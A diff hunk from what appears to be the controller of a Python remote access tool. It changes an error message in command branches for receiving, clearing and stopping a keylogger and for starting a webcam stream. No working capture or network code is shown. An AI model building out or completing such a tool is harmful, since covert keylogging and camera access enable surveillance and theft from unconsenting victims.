@@ -291,20 +291,20 @@ def shellc():
                 if main_keylogger:
                     recv_keylog()
                 else:
-                    print("The main function didn't called, aborting")
+                    print("The main function is not called, aborting")
                     pass
             elif perintah == 'clear_log':
                 if main_keylogger:
                     pass
                 else:
-                    print("The main function didn't called, aborting")
+                    print("The main function is not called, aborting")
                     pass
             elif perintah == 'stop_log':
                 if main_keylogger:
                     print('stoping keylogger')
                     pass
                 else:
-                    print("The main function didn't called, aborting")
+                    print("The main function is not called, aborting")
                     pass
             elif perintah == 'start_cam':
                 konversi_byte_stream()
